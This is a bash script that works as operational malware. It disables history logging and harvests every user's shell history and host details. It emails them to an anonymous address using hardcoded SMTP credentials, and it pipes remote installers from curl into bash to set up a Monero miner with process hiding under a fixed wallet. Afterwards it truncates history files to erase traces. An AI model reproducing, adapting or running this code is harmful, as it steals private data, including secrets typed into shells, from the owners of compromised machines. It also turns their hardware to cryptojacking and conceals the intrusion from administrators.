#!/bin/bash
unset HISTFILE

# Function to collect history from all available shells
collect_shell_history() {
    echo "=== COLLECTING SHELL HISTORIES ==="

    # List of common shell history files
    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    # System-wide shells (check /etc/shells)
    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)

    OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
                hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done

    # Also check for root histories if running as root
    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi

    echo -e "$OUTPUT"
}

# Function to send email with all histories
send_histories_email() {
    # Get system info
    HOSTNAME=$(hostname)
    PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "N/A")
    LOCAL_IP=$(hostname -I | awk '{print $1}')
    USER=$(whoami)

    # Format email
    EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== RESOURCES ===
RAM: $(free -h | awk '/^Mem:/ {print $2}')
CPU: $(nproc) cores
Storage: $(df -h / | awk 'NR==2 {print $2}')

$(collect_shell_history)
EOF
    )

    recipient="ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com"
    subject="Full Shell History Report from $HOSTNAME"

    smtp_server="smtp.mailersend.net"
    port=587
    sender_email="MS_wfRIsR@trial-yxj6lj9x6614do2r.mlsender.net"
    password="mssp.JfxiTRI.351ndgwy7ndlzqx8.AMTiGYy"

    # Create a temporary file to store the email content
    TEMP_FILE=$(mktemp)
    echo -n "$EMAIL_CONTENT" > "$TEMP_FILE"

    # Try sending email via Python with STARTTLS
    python_result=$(python -c "
import smtplib
import ssl
import os

port = $port
smtp_server = '$smtp_server'
sender_email = '$sender_email'
password = '$password'
receiver_email = '$recipient'
subject = '$subject'
body_file = '$TEMP_FILE'

with open(body_file, 'r', encoding='utf-8', errors='ignore') as f:
    body = f.read()

message = f'Subject: {subject}\\n\\n{body}'

context = ssl.create_default_context()
try:
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.encode('utf-8', errors='ignore'))
    print('Email sent successfully via Python using smtp.mailersend.net.')
    exit(0)
except Exception as e:
    print(f'Error sending email via Python using smtp.mailersend.net: {e}')
    print(f'Details: {e}')
    exit(1)
"
    )
    python_exit_code=$?

    # Fallback logic (using TEMP_FILE)
    if [ "$python_exit_code" -ne 0 ]; then
        echo "$python_result"
        if command -v mail &>/dev/null; then
            echo "Sending email using mail command..."
            cat "$TEMP_FILE" | mail -s "$subject" "$recipient"
            if [ $? -eq 0 ]; then
                echo "Email sent successfully via mail command."
            else
                echo "Error sending email via mail command."
            fi
        else
            echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
            cat "$TEMP_FILE" > /tmp/system_report.txt
            echo "System report stored in /tmp/system_report.txt"
        fi
    fi

    # Clean up the temporary file
    rm -f "$TEMP_FILE"
}


# Original service check functions
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# --- Main Execution ---

# Service checks
services=("swapd" "gdm2")
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "ERROR: Service $service is running. Aborting."
            exit 1
        fi
    fi
done

# System info display
echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

# Send all shell histories
send_histories_email

# Enhanced history cleanup for all shells
cleanup_histories() {
    echo "Cleaning the last 10 lines of all shell histories..."

    # Function to clean the last 10 lines of a given history file
    clean_history_file() {
        local file="$1"
        if [ -f "$file" ]; then
            local line_count=$(wc -l < "$file")
            if [ "$line_count" -gt 10 ]; then
                head -n $((line_count - 10)) "$file" > "${file}.tmp"
                mv "${file}.tmp" "$file"
                echo "Cleaned last 10 lines of: $file"
            elif [ "$line_count" -gt 0 ]; then
                echo "History file '$file' has less than or equal to 10 lines. Not cleaning."
            else
                echo "History file '$file' is empty."
            fi
        else
            echo "History file '$file' not found."
        fi
    }

    # List of common shell history files
    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )

    # Clean current user's histories
    for shell in "${!SHELL_HISTORIES[@]}"; do
        clean_history_file "${SHELL_HISTORIES[$shell]}"
    done

    # Root cleans all user histories if running as root
    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                clean_history_file "/home/$user/${SHELL_HISTORIES[$shell]##*/}"
            done
        done
    fi
}

# Original installation functions
rootstuff() {
  echo -e "\nStarting root installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  echo -e "\nStarting user installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

# Original execution logic
if [[ $(id -u) -eq 0 ]]; then
    rootstuff
else
    userstuff
fi

cleanup_histories
